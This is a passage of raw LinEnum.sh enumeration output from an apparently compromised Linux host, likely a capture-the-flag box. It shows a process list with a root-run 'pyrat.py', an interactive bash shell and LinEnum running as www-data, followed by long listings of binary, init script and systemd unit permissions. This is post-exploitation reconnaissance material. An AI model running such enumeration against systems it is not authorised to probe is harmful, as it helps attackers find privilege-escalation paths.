root         692  0.0  0.1   8364  3424 ?        S    21:17   0:00 /usr/sbin/CRON -f
root         698  0.0  0.3  17236  7356 ?        Ss   21:17   0:00 /lib/systemd/systemd-logind
root         701  0.0  0.6 393268 12080 ?        Ssl  21:17   0:00 /usr/lib/udisks2/udisksd
daemon       703  0.0  0.1   3804  2304 ?        Ss   21:17   0:00 /usr/sbin/atd -f
root         728  0.0  0.1   5608  2232 ttyS0    Ss+  21:17   0:00 /sbin/agetty -o -p -- \u --keep-baud 115200,38400,9600 ttyS0 vt220
root         735  0.0  0.0   2616   592 ?        Ss   21:17   0:00 /bin/sh -c python3 /root/pyrat.py 2>/dev/null
root         736  0.0  0.7  21872 14644 ?        S    21:17   0:00 python3 /root/pyrat.py
root         743  0.0  0.0   5836  1820 tty1     Ss+  21:17   0:00 /sbin/agetty -o -p -- \u --noclear tty1 linux
root         746  0.0  0.6 243176 12464 ?        Sl   21:17   0:00 python3 /root/pyrat.py
root         758  0.0  1.0 107948 20768 ?        Ssl  21:17   0:00 /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal
root         763  0.0  0.5 241392 11364 ?        Ssl  21:17   0:00 /usr/sbin/ModemManager
root         765  0.0  0.3  12196  6960 ?        Ss   21:17   0:00 sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups
root        1401  0.0  0.2  38076  4544 ?        Ss   21:17   0:00 /usr/lib/postfix/sbin/master -w
postfix     1402  0.0  0.3  38344  6212 ?        S    21:17   0:00 pickup -l -t unix -u -c
postfix     1403  0.0  0.3  38396  6172 ?        S    21:17   0:00 qmgr -l -t unix -u
www-data    1687  0.0  0.0      0     0 ?        Z    21:22   0:00 [python3] <defunct>
root        1692  0.0  0.0      0     0 ?        I    21:23   0:00 [kworker/u4:1-events_power_efficient]
www-data    1701  0.0  0.6  22144 12208 ?        S    21:27   0:00 python3 /root/pyrat.py
www-data    1705  0.0  0.2   7244  3988 ?        S    21:27   0:00 /bin/bash -i
root        1708  0.0  0.0      0     0 ?        I    21:28   0:00 [kworker/u4:0-events_unbound]
www-data    1711  0.0  0.2   7692  4016 ?        S    21:29   0:00 /bin/bash ./LinEnum.sh
www-data    1712  0.2  0.1   7828  3000 ?        S    21:29   0:00 /bin/bash ./LinEnum.sh
www-data    1713  0.0  0.0   5492   520 ?        S    21:29   0:00 tee -a
postfix     1803  0.0  0.3  38448  6116 ?        S    21:29   0:00 cleanup -z -t unix -u -c
postfix     1804  0.0  0.3  38352  6144 ?        S    21:29   0:00 trivial-rewrite -n rewrite -t unix -u -c
postfix     1805  0.0  0.2  38148  5916 ?        S    21:29   0:00 local -t unix
postfix     1806  0.0  0.3  38372  6164 ?        S    21:29   0:00 bounce -z -t unix -u -c
postfix     1807  0.0  0.3  38372  6132 ?        S    21:29   0:00 bounce -z -t unix -u -c
root        1920  0.0  0.0      0     0 ?        I    21:29   0:00 [kworker/0:0-events]
root        1922  0.0  0.2  23212  4008 ?        S    21:29   0:00 /lib/systemd/systemd-udevd
root        1928  0.0  0.0      0     0 ?        I    21:29   0:00 [kworker/1:0]
www-data    1929  0.0  0.0   7824  1912 ?        S    21:29   0:00 /bin/bash ./LinEnum.sh
www-data    1930  0.0  0.1   8896  3276 ?        R    21:29   0:00 ps aux


[-] Process binaries and associated permissions (from above list):
-rwxr-xr-x 1 root root  1183448 Apr 18  2022 /bin/bash
lrwxrwxrwx 1 root root        4 Feb 23  2022 /bin/sh -> dash
-rwxr-xr-x 1 root root   162032 Jun 17  2024 /lib/systemd/systemd-journald
-rwxr-xr-x 1 root root   268576 Jun 17  2024 /lib/systemd/systemd-logind
-rwxr-xr-x 1 root root  2245632 Jun 17  2024 /lib/systemd/systemd-networkd
-rwxr-xr-x 1 root root   415968 Jun 17  2024 /lib/systemd/systemd-resolved
-rwxr-xr-x 1 root root    55520 Jun 17  2024 /lib/systemd/systemd-timesyncd
-rwxr-xr-x 1 root root   760392 Jun 17  2024 /lib/systemd/systemd-udevd
-rwxr-xr-x 1 root root    69000 Apr  9  2024 /sbin/agetty
lrwxrwxrwx 1 root root       20 Jun 17  2024 /sbin/init -> /lib/systemd/systemd
-rwxr-xr-x 1 root root   129224 Apr 30  2024 /sbin/multipathd
-rwxr-xr-x 1 root root 15290392 Mar  4  2024 /usr/bin/amazon-ssm-agent
-rwxr-xr-x 1 root root   249032 Oct 25  2022 /usr/bin/dbus-daemon
lrwxrwxrwx 1 root root        9 Mar 13  2020 /usr/bin/python3 -> python3.8
-rwxr-xr-x 1 root root   207288 Mar  8  2024 /usr/lib/accountsservice/accounts-daemon
-rwxr-xr-x 1 root root   121504 Feb 21  2022 /usr/lib/policykit-1/polkitd
-rwxr-xr-x 1 root root    47344 Jan 29  2024 /usr/lib/postfix/sbin/master
-rwxr-xr-x 1 root root   483056 Sep  6  2021 /usr/lib/udisks2/udisksd
-rwxr-xr-x 1 root root    30728 Nov 12  2018 /usr/sbin/atd
-rwxr-xr-x 1 root root    55944 Feb 13  2020 /usr/sbin/cron
-rwxr-xr-x 1 root root    64432 Feb 13  2020 /usr/sbin/irqbalance
-rwxr-xr-x 1 root root  1915728 Apr  8  2022 /usr/sbin/ModemManager
-rwxr-xr-x 1 root root   727248 May  3  2022 /usr/sbin/rsyslogd


[-] /etc/init.d/ binary permissions:
total 136
drwxr-xr-x   2 root root 4096 Apr 27  2025 .
drwxr-xr-x 106 root root 4096 Dec 28 21:17 ..
-rwxr-xr-x   1 root root 3740 Apr  1  2020 apparmor
-rwxr-xr-x   1 root root 2915 Apr 13  2023 apport
-rwxr-xr-x   1 root root 1071 Jul 24  2018 atd
-rwxr-xr-x   1 root root 1257 Dec 22  2023 console-setup.sh
-rwxr-xr-x   1 root root 3059 Feb 11  2020 cron
-rwxr-xr-x   1 root root  937 Feb  4  2020 cryptdisks
-rwxr-xr-x   1 root root  896 Feb  4  2020 cryptdisks-early
-rwxr-xr-x   1 root root 3152 Sep 30  2019 dbus
-rwxr-xr-x   1 root root  985 Aug 12  2021 grub-common
-rwxr-xr-x   1 root root 3809 Jul 28  2019 hwclock.sh
-rwxr-xr-x   1 root root 2638 Dec 13  2019 irqbalance
-rwxr-xr-x   1 root root 1503 Nov  8  2018 iscsid
-rwxr-xr-x   1 root root 1479 Nov 27  2019 keyboard-setup.sh
-rwxr-xr-x   1 root root 2044 Feb 19  2020 kmod
-rwxr-xr-x   1 root root  695 Jan 28  2020 lvm2
-rwxr-xr-x   1 root root  586 Jan 28  2020 lvm2-lvmpolld
-rwxr-xr-x   1 root root 2503 Mar 18  2021 open-iscsi
-rwxr-xr-x   1 root root 1846 Mar  9  2020 open-vm-tools
-rwxr-xr-x   1 root root 1366 Mar 23  2020 plymouth
-rwxr-xr-x   1 root root  752 Mar 23  2020 plymouth-log
-rwxr-xr-x   1 root root 3368 Aug 31  2021 postfix
-rwxr-xr-x   1 root root  924 Feb 13  2020 procps
-rwxr-xr-x   1 root root 4417 Oct 28  2021 rsync
-rwxr-xr-x   1 root root 2864 Mar  7  2019 rsyslog
-rwxr-xr-x   1 root root 1222 Apr  2  2017 screen-cleanup
-rwxr-xr-x   1 root root 3939 Dec  2  2021 ssh
-rwxr-xr-x   1 root root 6872 Apr 22  2020 udev
-rwxr-xr-x   1 root root 2083 Jan 21  2020 ufw
-rwxr-xr-x   1 root root 1391 Jul 21  2020 unattended-upgrades
-rwxr-xr-x   1 root root 1306 Feb  7  2022 uuidd


[-] /etc/init/ config file permissions:
total 12
drwxr-xr-x   2 root root 4096 Apr 15  2024 .
drwxr-xr-x 106 root root 4096 Dec 28 21:17 ..
-rw-r--r--   1 root root  719 Mar  4  2024 amazon-ssm-agent.conf


[-] /lib/systemd/* config file permissions:
/lib/systemd/:
total 8.7M
drwxr-xr-x 25 root root  36K May 25  2025 system
drwxr-xr-x  2 root root 4.0K May 25  2025 system-generators
drwxr-xr-x  4 root root 4.0K Apr 27  2025 user
drwxr-xr-x  2 root root 4.0K Apr 27  2025 user-environment-generators
drwxr-xr-x  2 root root 4.0K Apr 27  2025 catalog
drwxr-xr-x  2 root root 4.0K Apr 27  2025 system-preset
drwxr-xr-x  2 root root 4.0K Apr 27  2025 user-preset
drwxr-xr-x  2 root root 4.0K Apr 27  2025 network
drwxr-xr-x  2 root root 4.0K Apr 27  2025 ntp-units.d
-rw-r--r--  1 root root 2.4M Jun 17  2024 libsystemd-shared-245.so
-rw-r--r--  1 root root  701 Jun 17  2024 resolv.conf
-rwxr-xr-x  1 root root 1.3K Jun 17  2024 set-cpufreq
-rwxr-xr-x  1 root root 1.6M Jun 17  2024 systemd
-rwxr-xr-x  1 root root  15K Jun 17  2024 systemd-ac-power
-rwxr-xr-x  1 root root  27K Jun 17  2024 systemd-backlight
-rwxr-xr-x  1 root root  19K Jun 17  2024 systemd-binfmt
-rwxr-xr-x  1 root root  31K Jun 17  2024 systemd-bless-boot
-rwxr-xr-x  1 root root  15K Jun 17  2024 systemd-boot-check-no-failures
-rwxr-xr-x  1 root root  15K Jun 17  2024 systemd-cgroups-agent
-rwxr-xr-x  1 root root  35K Jun 17  2024 systemd-cryptsetup
-rwxr-xr-x  1 root root  23K Jun 17  2024 systemd-dissect
-rwxr-xr-x  1 root root  27K Jun 17  2024 systemd-fsck
-rwxr-xr-x  1 root root  31K Jun 17  2024 systemd-fsckd
-rwxr-xr-x  1 root root  23K Jun 17  2024 systemd-growfs
-rwxr-xr-x  1 root root  15K Jun 17  2024 systemd-hibernate-resume
-rwxr-xr-x  1 root root  35K Jun 17  2024 systemd-hostnamed
-rwxr-xr-x  1 root root  19K Jun 17  2024 systemd-initctl
-rwxr-xr-x  1 root root 159K Jun 17  2024 systemd-journald
-rwxr-xr-x  1 root root  43K Jun 17  2024 systemd-localed
-rwxr-xr-x  1 root root 263K Jun 17  2024 systemd-logind
-rwxr-xr-x  1 root root  15K Jun 17  2024 systemd-makefs
-rwxr-xr-x  1 root root  19K Jun 17  2024 systemd-modules-load
-rwxr-xr-x  1 root root 2.2M Jun 17  2024 systemd-networkd
-rwxr-xr-x  1 root root  31K Jun 17  2024 systemd-networkd-wait-online
-rwxr-xr-x  1 root root  35K Jun 17  2024 systemd-network-generator
-rwxr-xr-x  1 root root  23K Jun 17  2024 systemd-pstore
-rwxr-xr-x  1 root root  15K Jun 17  2024 systemd-quotacheck
-rwxr-xr-x  1 root root  23K Jun 17  2024 systemd-random-seed
-rwxr-xr-x  1 root root  19K Jun 17  2024 systemd-remount-fs
-rwxr-xr-x  1 root root  15K Jun 17  2024 systemd-reply-password
-rwxr-xr-x  1 root root 407K Jun 17  2024 systemd-resolved
-rwxr-xr-x  1 root root  23K Jun 17  2024 systemd-rfkill
-rwxr-xr-x  1 root root  55K Jun 17  2024 systemd-shutdown
-rwxr-xr-x  1 root root  27K Jun 17  2024 systemd-sleep
-rwxr-xr-x  1 root root  31K Jun 17  2024 systemd-socket-proxyd
-rwxr-xr-x  1 root root  15K Jun 17  2024 systemd-sulogin-shell
-rwxr-xr-x  1 root root  23K Jun 17  2024 systemd-sysctl
-rwxr-xr-x  1 root root 1.4K Jun 17  2024 systemd-sysv-install
-rwxr-xr-x  1 root root  47K Jun 17  2024 systemd-timedated
-rwxr-xr-x  1 root root  55K Jun 17  2024 systemd-timesyncd
-rwxr-xr-x  1 root root  15K Jun 17  2024 systemd-time-wait-sync
-rwxr-xr-x  1 root root 743K Jun 17  2024 systemd-udevd
-rwxr-xr-x  1 root root  15K Jun 17  2024 systemd-update-utmp
-rwxr-xr-x  1 root root  23K Jun 17  2024 systemd-user-runtime-dir
-rwxr-xr-x  1 root root  15K Jun 17  2024 systemd-user-sessions
-rwxr-xr-x  1 root root  15K Jun 17  2024 systemd-veritysetup
-rwxr-xr-x  1 root root  19K Jun 17  2024 systemd-volatile-root
drwxr-xr-x  2 root root 4.0K Jun 15  2023 system-shutdown
drwxr-xr-x  2 root root 4.0K Jun  2  2023 logind.conf.d
drwxr-xr-x  2 root root 4.0K Jun  2  2023 system-sleep
drwxr-xr-x  3 root root 4.0K Feb 23  2022 boot
drwxr-xr-x  2 root root 4.0K Apr 22  2020 user-generators

/lib/systemd/system:
total 1.2M
drwxr-xr-x 2 root root 4.0K May 25  2025 sshd-keygen@.service.d
drwxr-xr-x 2 root root 4.0K Apr 27  2025 multi-user.target.wants
drwxr-xr-x 2 root root 4.0K Apr 27  2025 rescue.target.wants
drwxr-xr-x 2 root root 4.0K Apr 27  2025 sockets.target.wants
drwxr-xr-x 2 root root 4.0K Apr 27  2025 sysinit.target.wants
drwxr-xr-x 2 root root 4.0K Apr 27  2025 timers.target.wants
drwxr-xr-x 2 root root 4.0K Apr 27  2025 getty.target.wants
drwxr-xr-x 2 root root 4.0K Apr 27  2025 graphical.target.wants
drwxr-xr-x 2 root root 4.0K Apr 27  2025 rc-local.service.d
drwxr-xr-x 2 root root 4.0K Apr 27  2025 user@.service.d
drwxr-xr-x 2 root root 4.0K Apr 27  2025 user-.slice.d
-rw-r--r-- 1 root root  553 Mar 13  2025 cloud-config.service
-rw-r--r-- 1 root root  883 Mar 13  2025 cloud-config.target
-rw-r--r-- 1 root root  651 Mar 13  2025 cloud-final.service
-rw-r--r-- 1 root root 1012 Mar 13  2025 cloud-init-hotplugd.service
-rw-r--r-- 1 root root  602 Mar 13  2025 cloud-init-hotplugd.socket
-rw-r--r-- 1 root root  679 Mar 13  2025 cloud-init-local.service
-rw-r--r-- 1 root root  802 Mar 13  2025 cloud-init.service
-rw-r--r-- 1 root root  617 Mar 13  2025 cloud-init.target
-rw-r--r-- 1 root root  404 Jan 21  2025 pollinate.service
-rw-r--r-- 1 root root  255 Jan 16  2025 rsync.service
-rw-r--r-- 1 root root  376 Oct 17  2024 xfs_scrub_all.service
-rw-r--r-- 1 root root  250 Oct 17  2024 xfs_scrub_all.timer
-rw-r--r-- 1 root root  272 Oct 17  2024 xfs_scrub_fail@.service
-rw-r--r-- 1 root root  561 Oct 17  2024 xfs_scrub@.service
-rw-r--r-- 1 root root 1.6K Aug  8  2024 apt-news.service
-rw-r--r-- 1 root root 1005 Aug  8  2024 esm-cache.service
-rw-r--r-- 1 root root  830 Aug  8  2024 ua-reboot-cmds.service
-rw-r--r-- 1 root root  640 Aug  8  2024 ua-timer.service
-rw-r--r-- 1 root root  322 Aug  8  2024 ua-timer.timer
-rw-r--r-- 1 root root 1.6K Aug  8  2024 ubuntu-advantage.service
lrwxrwxrwx 1 root root   14 Jun 17  2024 autovt@.service -> getty@.service
-rw-r--r-- 1 root root 1.1K Jun 17  2024 console-getty.service
-rw-r--r-- 1 root root 1.3K Jun 17  2024 container-getty@.service
lrwxrwxrwx 1 root root    9 Jun 17  2024 cryptdisks-early.service -> /dev/null
lrwxrwxrwx 1 root root    9 Jun 17  2024 cryptdisks.service -> /dev/null
lrwxrwxrwx 1 root root   13 Jun 17  2024 ctrl-alt-del.target -> reboot.target
lrwxrwxrwx 1 root root   25 Jun 17  2024 dbus-org.freedesktop.hostname1.service -> systemd-hostnamed.service
lrwxrwxrwx 1 root root   23 Jun 17  2024 dbus-org.freedesktop.locale1.service -> systemd-localed.service
lrwxrwxrwx 1 root root   22 Jun 17  2024 dbus-org.freedesktop.login1.service -> systemd-logind.service
lrwxrwxrwx 1 root root   25 Jun 17  2024 dbus-org.freedesktop.timedate1.service -> systemd-timedated.service
-rw-r--r-- 1 root root 1.1K Jun 17  2024 debug-shell.service
lrwxrwxrwx 1 root root   16 Jun 17  2024 default.target -> graphical.target
-rw-r--r-- 1 root root  797 Jun 17  2024 emergency.service
-rw-r--r-- 1 root root 2.0K Jun 17  2024 getty@.service
-rw-r--r-- 1 root root  342 Jun 17  2024 getty-static.service
lrwxrwxrwx 1 root root    9 Jun 17  2024 hwclock.service -> /dev/null
lrwxrwxrwx 1 root root   28 Jun 17  2024 kmod.service -> systemd-modules-load.service
-rw-r--r-- 1 root root  716 Jun 17  2024 kmod-static-nodes.service
-rw-r--r-- 1 root root  601 Jun 17  2024 modprobe@.service
-rw-r--r-- 1 root root  362 Jun 17  2024 ondemand.service
lrwxrwxrwx 1 root root   22 Jun 17  2024 procps.service -> systemd-sysctl.service
-rw-r--r-- 1 root root  609 Jun 17  2024 quotaon.service
-rw-r--r-- 1 root root  716 Jun 17  2024 rc-local.service
lrwxrwxrwx 1 root root    9 Jun 17  2024 rc.service -> /dev/null
lrwxrwxrwx 1 root root    9 Jun 17  2024 rcS.service -> /dev/null
-rw-r--r-- 1 root root  788 Jun 17  2024 rescue.service
lrwxrwxrwx 1 root root   15 Jun 17  2024 runlevel0.target -> poweroff.target
lrwxrwxrwx 1 root root   13 Jun 17  2024 runlevel1.target -> rescue.target
lrwxrwxrwx 1 root root   17 Jun 17  2024 runlevel2.target -> multi-user.target
lrwxrwxrwx 1 root root   17 Jun 17  2024 runlevel3.target -> multi-user.target
lrwxrwxrwx 1 root root   17 Jun 17  2024 runlevel4.target -> multi-user.target
lrwxrwxrwx 1 root root   16 Jun 17  2024 runlevel5.target -> graphical.target
lrwxrwxrwx 1 root root   13 Jun 17  2024 runlevel6.target -> reboot.target
-rw-r--r-- 1 root root 1.5K Jun 17  2024 serial-getty@.service
-rw-r--r-- 1 root root  830 Jun 17  2024 sys-kernel-config.mount
-rw-r--r-- 1 root root  719 Jun 17  2024 systemd-backlight@.service
-rw-r--r-- 1 root root 1.2K Jun 17  2024 systemd-binfmt.service
-rw-r--r-- 1 root root  678 Jun 17  2024 systemd-bless-boot.service
-rw-r--r-- 1 root root  718 Jun 17  2024 systemd-boot-check-no-failures.service
-rw-r--r-- 1 root root  551 Jun 17  2024 systemd-fsckd.service
-rw-r--r-- 1 root root  540 Jun 17  2024 systemd-fsckd.socket
-rw-r--r-- 1 root root  740 Jun 17  2024 systemd-fsck-root.service
-rw-r--r-- 1 root root  741 Jun 17  2024 systemd-fsck@.service
-rw-r--r-- 1 root root  671 Jun 17  2024 systemd-hibernate-resume@.service
-rw-r--r-- 1 root root  541 Jun 17  2024 systemd-hibernate.service
-rw-r--r-- 1 root root 1.2K Jun 17  2024 systemd-hostnamed.service
-rw-r--r-- 1 root root  813 Jun 17  2024 systemd-hwdb-update.service
-rw-r--r-- 1 root root  559 Jun 17  2024 systemd-hybrid-sleep.service
-rw-r--r-- 1 root root  566 Jun 17  2024 systemd-initctl.service
-rw-r--r-- 1 root root  686 Jun 17  2024 systemd-journald-audit.socket
-rw-r--r-- 1 root root 1.6K Jun 17  2024 systemd-journald.service
-rw-r--r-- 1 root root 1.5K Jun 17  2024 systemd-journald@.service
-rw-r--r-- 1 root root 1.2K Jun 17  2024 systemd-localed.service
-rw-r--r-- 1 root root 2.1K Jun 17  2024 systemd-logind.service
-rw-r--r-- 1 root root 1.1K Jun 17  2024 systemd-modules-load.service
-rw-r--r-- 1 root root 2.0K Jun 17  2024 systemd-networkd.service
-rw-r--r-- 1 root root  740 Jun 17  2024 systemd-networkd-wait-online.service
-rw-r--r-- 1 root root  635 Jun 17  2024 systemd-network-generator.service
-rw-r--r-- 1 root root 1.1K Jun 17  2024 systemd-pstore.service
-rw-r--r-- 1 root root  655 Jun 17  2024 systemd-quotacheck.service
-rw-r--r-- 1 root root 1.1K Jun 17  2024 systemd-random-seed.service
-rw-r--r-- 1 root root  767 Jun 17  2024 systemd-remount-fs.service
-rw-r--r-- 1 root root 1.7K Jun 17  2024 systemd-resolved.service
-rw-r--r-- 1 root root  717 Jun 17  2024 systemd-rfkill.service
-rw-r--r-- 1 root root  537 Jun 17  2024 systemd-suspend.service
-rw-r--r-- 1 root root  596 Jun 17  2024 systemd-suspend-then-hibernate.service
-rw-r--r-- 1 root root  693 Jun 17  2024 systemd-sysctl.service
-rw-r--r-- 1 root root 1.2K Jun 17  2024 systemd-timedated.service
-rw-r--r-- 1 root root 1.5K Jun 17  2024 systemd-timesyncd.service
-rw-r--r-- 1 root root 1.2K Jun 17  2024 systemd-time-wait-sync.service
-rw-r--r-- 1 root root 1.2K Jun 17  2024 systemd-udevd.service
-rw-r--r-- 1 root root  797 Jun 17  2024 systemd-update-utmp-runlevel.service
-rw-r--r-- 1 root root  794 Jun 17  2024 systemd-update-utmp.service
-rw-r--r-- 1 root root  628 Jun 17  2024 systemd-user-sessions.service
-rw-r--r-- 1 root root  690 Jun 17  2024 systemd-volatile-root.service
lrwxrwxrwx 1 root root   21 Jun 17  2024 udev.service -> systemd-udevd.service
-rw-r--r-- 1 root root  688 Jun 17  2024 user-runtime-dir@.service
-rw-r--r-- 1 root root  748 Jun 17  2024 user@.service
lrwxrwxrwx 1 root root    9 Jun 17  2024 x11-common.service -> /dev/null
-rw-r--r-- 1 root root  290 Jun  6  2024 thermald.service
-rw-r--r-- 1 root root  807 Apr 30  2024 multipathd.service
-rw-r--r-- 1 root root  186 Apr 30  2024 multipathd.socket
lrwxrwxrwx 1 root root    9 Apr 30  2024 multipath-tools-boot.service -> /dev/null
lrwxrwxrwx 1 root root   18 Apr 30  2024 multipath-tools.service -> multipathd.service
-rw-r--r-- 1 root root  466 Apr  9  2024 fstrim.service
-rw-r--r-- 1 root root  205 Apr  9  2024 fstrim.timer
-rw-r--r-- 1 root root  538 Apr  9  2024 uuidd.service
-rw-r--r-- 1 root root  126 Apr  9  2024 uuidd.socket
-rw-r--r-- 1 root root  741 Mar  8  2024 accounts-daemon.service
-rw-r--r-- 1 root root  588 Mar  4  2024 amazon-ssm-agent.service
-rw-r--r-- 1 root root  173 Jan  2  2024 motd-news.service
-rw-r--r-- 1 root root  161 Jan  2  2024 motd-news.timer
-rw-r--r-- 1 root root 1.2K Oct 10  2023 apparmor.service
-rw-r--r-- 1 root root  297 Oct  9  2023 e2scrub_all.service
-rw-r--r-- 1 root root  251 Oct  9  2023 e2scrub_all.timer
-rw-r--r-- 1 root root  245 Oct  9  2023 e2scrub_fail@.service
-rw-r--r-- 1 root root  550 Oct  9  2023 e2scrub_reap.service
-rw-r--r-- 1 root root  438 Oct  9  2023 e2scrub@.service
-rw-r--r-- 1 root root  326 Oct  6  2023 apt-daily.service
-rw-r--r-- 1 root root  156 Oct  6  2023 apt-daily.timer
-rw-r--r-- 1 root root  389 Oct  6  2023 apt-daily-upgrade.service
-rw-r--r-- 1 root root  184 Oct  6  2023 apt-daily-upgrade.timer
drwxr-xr-x 2 root root 4.0K Jun 15  2023 system-update.target.wants
-rw-r--r-- 1 root root  406 May 11  2023 fwupd-offline-update.service
-rw-r--r-- 1 root root  450 May 11  2023 fwupd-refresh.service
-rw-r--r-- 1 root root  650 May 11  2023 fwupd.service
-rw-r--r-- 1 root root  212 Apr 13  2023 apport-autoreport.path
-rw-r--r-- 1 root root  242 Apr 13  2023 apport-autoreport.service
lrwxrwxrwx 1 root root    9 Apr  4  2023 sudo.service -> /dev/null
-rw-r--r-- 1 root root  184 Apr  3  2023 rescue-ssh.target
-rw-r--r-- 1 root root  538 Apr  3  2023 ssh.service
-rw-r--r-- 1 root root  318 Apr  3  2023 ssh@.service
-rw-r--r-- 1 root root  216 Apr  3  2023 ssh.socket
-rw-r--r-- 1 root root  408 Dec 18  2022 grub-initrd-fallback.service
-rw-r--r-- 1 root root  583 Dec  2  2022 grub-common.service
-rw-r--r-- 1 root root  505 Oct 25  2022 dbus.service
-rw-r--r-- 1 root root  106 Oct 25  2022 dbus.socket
-rw-r--r-- 1 root root  642 Sep 16  2022 bolt.service
-rw-r--r-- 1 root root  489 Sep  8  2022 open-vm-tools.service
-rw-r--r-- 1 root root  408 Sep  8  2022 vgauth.service
-rw-r--r-- 1 root root  194 Jul 25  2022 fwupd-refresh.timer
-rw-r--r-- 1 root root  258 May  4  2022 networkd-dispatcher.service
-rw-r--r-- 1 root root  435 May  3  2022 rsyslog.service
-rw-r--r-- 1 root root  377 Apr 25  2022 unattended-upgrades.service
-rw-r--r-- 1 root root  480 Apr  8  2022 ModemManager.service
lrwxrwxrwx 1 root root    9 Feb 23  2022 screen-cleanup.service -> /dev/null
drwxr-xr-x 2 root root 4.0K Feb 23  2022 halt.target.wants
drwxr-xr-x 2 root root 4.0K Feb 23  2022 initrd-switch-root.target.wants
drwxr-xr-x 2 root root 4.0K Feb 23  2022 kexec.target.wants
drwxr-xr-x 2 root root 4.0K Feb 23  2022 poweroff.target.wants
drwxr-xr-x 2 root root 4.0K Feb 23  2022 reboot.target.wants
-rw-r--r-- 1 root root  169 Sep  6  2021 clean-mount-point@.service
-rw-r--r-- 1 root root  203 Sep  6  2021 udisks2.service
-rw-r--r-- 1 root root  253 Aug 31  2021 postfix.service
-rw-r--r-- 1 root root  516 Aug 31  2021 postfix@.service
-rw-r--r-- 1 root root  175 Mar 18  2021 iscsid.socket
-rw-r--r-- 1 root root  987 Jan 19  2021 open-iscsi.service
-rw-r--r-- 1 root root  463 Jan 19  2021 iscsid.service
-rw-r--r-- 1 root root  447 Nov  2  2020 plymouth-halt.service
-rw-r--r-- 1 root root  461 Nov  2  2020 plymouth-kexec.service
lrwxrwxrwx 1 root root   27 Nov  2  2020 plymouth-log.service -> plymouth-read-write.service
-rw-r--r-- 1 root root  456 Nov  2  2020 plymouth-poweroff.service
-rw-r--r-- 1 root root  194 Nov  2  2020 plymouth-quit.service
-rw-r--r-- 1 root root  200 Nov  2  2020 plymouth-quit-wait.service
-rw-r--r-- 1 root root  244 Nov  2  2020 plymouth-read-write.service
-rw-r--r-- 1 root root  449 Nov  2  2020 plymouth-reboot.service
lrwxrwxrwx 1 root root   21 Nov  2  2020 plymouth.service -> plymouth-quit.service
-rw-r--r-- 1 root root  567 Nov  2  2020 plymouth-start.service
-rw-r--r-- 1 root root  291 Nov  2  2020 plymouth-switch-root.service
-rw-r--r-- 1 root root  525 Nov  2  2020 systemd-ask-password-plymouth.path
-rw-r--r-- 1 root root  502 Nov  2  2020 systemd-ask-password-plymouth.service
-rw-r--r-- 1 root root  481 Sep 28  2020 mdadm-grow-continue@.service
-rw-r--r-- 1 root root  210 Sep 28  2020 mdadm-last-resort@.service
-rw-r--r-- 1 root root  179 Sep 28  2020 mdadm-last-resort@.timer
-rw-r--r-- 1 root root  535 Sep 28  2020 mdcheck_continue.service
-rw-r--r-- 1 root root  435 Sep 28  2020 mdcheck_continue.timer
-rw-r--r-- 1 root root  483 Sep 28  2020 mdcheck_start.service
-rw-r--r-- 1 root root  463 Sep 28  2020 mdcheck_start.timer
-rw-r--r-- 1 root root  463 Sep 28  2020 mdmonitor-oneshot.service
-rw-r--r-- 1 root root  434 Sep 28  2020 mdmonitor-oneshot.timer
-rw-r--r-- 1 root root  388 Sep 28  2020 mdmonitor.service
-rw-r--r-- 1 root root 1.1K Sep 28  2020 mdmon@.service
-rw-r--r-- 1 root root  407 Sep 23  2020 packagekit-offline-update.service
-rw-r--r-- 1 root root  371 Sep 23  2020 packagekit.service
-rw-r--r-- 1 root root  396 Sep 10  2020 finalrd.service
drwxr-xr-x 2 root root 4.0K Apr 22  2020 local-fs.target.wants
drwxr-xr-x 2 root root 4.0K Apr 22  2020 runlevel1.target.wants
drwxr-xr-x 2 root root 4.0K Apr 22  2020 runlevel2.target.wants
drwxr-xr-x 2 root root 4.0K Apr 22  2020 runlevel3.target.wants
drwxr-xr-x 2 root root 4.0K Apr 22  2020 runlevel4.target.wants
drwxr-xr-x 2 root root 4.0K Apr 22  2020 runlevel5.target.wants
-rw-r--r-- 1 root root  919 Apr  1  2020 basic.target
-rw-r--r-- 1 root root  441 Apr  1  2020 blockdev@.target
-rw-r--r-- 1 root root  419 Apr  1  2020 bluetooth.target
-rw-r--r-- 1 root root  455 Apr  1  2020 boot-complete.target
-rw-r--r-- 1 root root  465 Apr  1  2020 cryptsetup-pre.target
-rw-r--r-- 1 root root  412 Apr  1  2020 cryptsetup.target
-rw-r--r-- 1 root root  750 Apr  1  2020 dev-hugepages.mount
-rw-r--r-- 1 root root  693 Apr  1  2020 dev-mqueue.mount
-rw-r--r-- 1 root root  471 Apr  1  2020 emergency.target
-rw-r--r-- 1 root root  541 Apr  1  2020 exit.target
-rw-r--r-- 1 root root  480 Apr  1  2020 final.target
-rw-r--r-- 1 root root  506 Apr  1  2020 getty-pre.target
-rw-r--r-- 1 root root  500 Apr  1  2020 getty.target
-rw-r--r-- 1 root root  598 Apr  1  2020 graphical.target
-rw-r--r-- 1 root root  527 Apr  1  2020 halt.target
-rw-r--r-- 1 root root  509 Apr  1  2020 hibernate.target
-rw-r--r-- 1 root root  530 Apr  1  2020 hybrid-sleep.target
-rw-r--r-- 1 root root  665 Apr  1  2020 initrd-cleanup.service
-rw-r--r-- 1 root root  528 Apr  1  2020 initrd-fs.target
-rw-r--r-- 1 root root  815 Apr  1  2020 initrd-parse-etc.service
-rw-r--r-- 1 root root  496 Apr  1  2020 initrd-root-device.target
-rw-r--r-- 1 root root  501 Apr  1  2020 initrd-root-fs.target
-rw-r--r-- 1 root root  584 Apr  1  2020 initrd-switch-root.service
-rw-r--r-- 1 root root  777 Apr  1  2020 initrd-switch-root.target
-rw-r--r-- 1 root root  698 Apr  1  2020 initrd.target
-rw-r--r-- 1 root root  813 Apr  1  2020 initrd-udevadm-cleanup-db.service
-rw-r--r-- 1 root root  541 Apr  1  2020 kexec.target
-rw-r--r-- 1 root root  435 Apr  1  2020 local-fs-pre.target
-rw-r--r-- 1 root root  482 Apr  1  2020 local-fs.target
-rw-r--r-- 1 root root  445 Apr  1  2020 machine.slice
-rw-r--r-- 1 root root  532 Apr  1  2020 multi-user.target
-rw-r--r-- 1 root root  505 Apr  1  2020 network-online.target
-rw-r--r-- 1 root root  502 Apr  1  2020 network-pre.target
-rw-r--r-- 1 root root  521 Apr  1  2020 network.target
-rw-r--r-- 1 root root  554 Apr  1  2020 nss-lookup.target
-rw-r--r-- 1 root root  513 Apr  1  2020 nss-user-lookup.target
